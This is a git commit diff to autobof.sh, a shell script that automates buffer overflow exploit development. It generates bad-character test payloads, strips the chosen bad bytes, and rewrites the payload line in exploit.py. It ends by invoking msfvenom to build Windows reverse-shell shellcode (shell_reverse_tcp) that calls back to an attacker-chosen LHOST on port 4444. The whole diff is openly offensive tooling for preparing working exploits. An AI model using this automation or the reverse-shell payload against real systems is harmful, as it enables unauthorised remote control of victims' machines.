85e7cd968c5d70572509390cf1261e0b91167428
Andrew Abwoga <andrew.abwoga@gmail.com>
2021-01-20 20:18:43 +0300

    Generate badchar payloads and auto modify exploit.py

--- autobof.sh
+++ autobof.sh
@@ -9,8 +9,10 @@ then
 echo "[+] Full bad characterset payload: "
 echo "payload = \"$(python2 badcharset.py)\""
 
-#echo "[+] Modifying exploit.py payload with full characterset..."
-#sed  "s/payload = \".*\"$/payload = \""$(python2 badcharset.py)"\"/g" -i exploit.py
+echo "[+] Modifying exploit.py payload with full characterset..."
+cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
+replacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}' ) 
+sed -i "/payload = \"\"/c $replacement" exploit.py
 fi
 
 if [ -n "$badchars" ]
@@ -21,11 +23,12 @@ then
 
     echo -n "[+] Bad character deduction: "
     pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
-    #echo "$pattern"
-    echo "$(python2 badcharset.py)" | sed "$pattern"
+    badcharsreplacement=$(echo -E "$(python2 badcharset.py)" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
+    echo $badcharsreplacement
 
-    #echo "[+] Modifying exploit.py payload with full characterset..."
-    #sed  "s/payload = \".*\"$/payload = \""$pattern"\"/g" -i exploit.py
+    echo "[+] Modifying exploit.py payload with characterset without bad characters..."
+    cat exploit.py | sed  -i 's/payload = ".*"$/payload = ""/g' exploit.py
+    sed -i "s/payload = \"\"/$badcharsreplacement/g" exploit.py
 
     echo -n "[+] msfvenom output: "
     echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"
